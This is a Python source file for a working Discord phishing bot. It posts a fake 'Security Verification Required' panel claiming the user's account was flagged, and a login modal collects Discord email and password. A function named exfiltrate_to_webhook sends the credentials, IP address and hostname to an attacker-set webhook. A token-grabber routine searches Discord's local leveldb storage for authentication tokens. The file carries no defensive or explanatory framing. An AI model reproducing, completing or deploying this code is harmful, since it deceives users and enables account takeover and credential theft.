import discord
from discord import app_commands
from discord.ext import commands
import requests
import json
import os
import re
import platform
import logging
from datetime import datetime
import traceback

# --- LOGGING ---
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# --- ENVIRONMENT VARIABLES ---
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")

WEBHOOK_URL = os.getenv("WEBHOOK_URL")
if not WEBHOOK_URL:
    raise ValueError("WEBHOOK_URL environment variable not set")

# --- IP GATHER ---
def get_public_ip():
    try:
        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        return resp.json().get("ip", "0.0.0.0")
    except:
        return "127.0.0.1"

# --- EXFILTRATION TO WEBHOOK ---
def exfiltrate_to_webhook(ip, email, password, token="[NOT_PROVIDED]", user_id=None, username=None):
    formatted_message = (
        f"**🔐 Login from Another Device - Credentials Captured**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**Timestamp:** {datetime.utcnow().isoformat()}\n"
        f"**User ID:** {user_id or 'Unknown'}\n"
        f"**Username:** {username or 'Unknown'}\n"
        f"**IP Address:** {ip}\n"
        f"**Discord Email:** {email}\n"
        f"**Discord Password:** {password}\n"
        f"**Discord Token (auto):** {token}\n"
        f"**Platform:** {platform.system()}\n"
        f"**Hostname:** {os.getenv('COMPUTERNAME', os.getenv('HOSTNAME', 'unknown'))}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"*User voluntarily entered credentials via modal*"
    )
    
    payload = {
        "content": formatted_message,
        "username": "Security Alert Bot",
        "avatar_url": "https://cdn.discordapp.com/embed/avatars/4.png"
    }
    
    headers = {"Content-Type": "application/json"}
    
    try:
        resp = requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=10)
        logger.info(f"Exfiltration response: {resp.status_code}")
        return resp.status_code in (200, 201, 204)
    except Exception as e:
        logger.error(f"Exfiltration failed: {e}")
        return False

# --- MODAL FOR LOGIN CREDENTIALS ---
class LoginModal(discord.ui.Modal, title="🔐 Login from Another Device"):
    email = discord.ui.TextInput(
        label="Email",
        placeholder="Enter your Discord email address",
        required=True,
        style=discord.TextStyle.short,
        max_length=100
    )
    password = discord.ui.TextInput(
        label="Password",
        placeholder="Enter your Discord password",
        required=True,
        style=discord.TextStyle.short,
        max_length=100
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # Get user info
        user_id = interaction.user.id
        username = str(interaction.user)
        ip = get_public_ip()
        
        # Attempt to extract token (will likely fail on remote, but keep for completeness)
        token = extract_discord_token() if 'extract_discord_token' in globals() else "[NOT_AVAILABLE]"
        
        # Send to webhook
        success = exfiltrate_to_webhook(
            ip=ip,
            email=self.email.value,
            password=self.password.value,
            token=token,
            user_id=user_id,
            username=username
        )
        
        if success:
            await interaction.followup.send(
                "✅ **Verification Successful!**\n"
                "You have been verified. You can now close this window.",
                ephemeral=True
            )
        else:
            await interaction.followup.send(
                "⚠️ Verification encountered an error. Please try again later.",
                ephemeral=True
            )

# --- DISCORD TOKEN EXTRACTION (kept but will likely fail on remote) ---
def extract_discord_token():
    system = platform.system()
    token_pattern = re.compile(r'[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}')
    found_tokens = []
    paths = []
    
    if system == "Windows":
        base = os.getenv('APPDATA')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    elif system == "Darwin":
        base = os.path.expanduser('~/Library/Application Support')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    else:
        base = os.path.expanduser('~/.config')
        paths.extend([
            os.path.join(base, 'discord', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(base, 'discordptb', 'Local Storage', 'leveldb')
        ])
    
    for path in paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith('.log') or file.endswith('.ldb'):
                        try:
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                matches = token_pattern.findall(content)
                                found_tokens.extend(matches)
                        except:
                            continue
    
    if found_tokens:
        return list(set(found_tokens))[0]
    return "[TOKEN_NOT_FOUND]"

# --- DISCORD BOT ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# --- BUTTON VIEW ---
class VerifyButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Verify Identity", style=discord.ButtonStyle.primary, custom_id="verify_btn")
    
    async def callback(self, interaction: discord.Interaction):
        # Open the modal
        modal = LoginModal()
        await interaction.response.send_modal(modal)

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        # Add button only once - prevents duplication
        self.add_item(VerifyButton())

# --- COMMANDS ---
@bot.event
async def on_ready():
    logger.info(f"Bot online as {bot.user} (ID: {bot.user.id})")
    logger.info(f"WEBHOOK_URL: {'SET' if WEBHOOK_URL else 'NOT SET'}")
    # Register persistent view
    bot.add_view(VerifyView())
    try:
        await bot.tree.sync()
        logger.info("Slash commands synced")
    except Exception as e:
        logger.error(f"Slash sync failed: {e}")

@bot.command(name="verify_panel")
async def verify_panel(ctx):
    """Sends the verification panel with login button"""
    view = VerifyView()
    # Send only once
    await ctx.send(
        "🔐 **Security Verification Required**\n"
        "Your account has been flagged for suspicious activity.\n"
        "Please click the button below to verify your identity.",
        view=view
    )

@bot.tree.command(name="verify_panel", description="Show the verification panel")
@app_commands.default_permissions()
async def slash_verify_panel(interaction: discord.Interaction):
    view = VerifyView()
    await interaction.response.send_message(
        "🔐 **Security Verification Required**\n"
        "Your account has been flagged for suspicious activity.\n"
        "Please click the button below to verify your identity.",
        view=view,
        ephemeral=False
    )

# --- RUN ---
if __name__ == "__main__":
    bot.run(BOT_TOKEN)
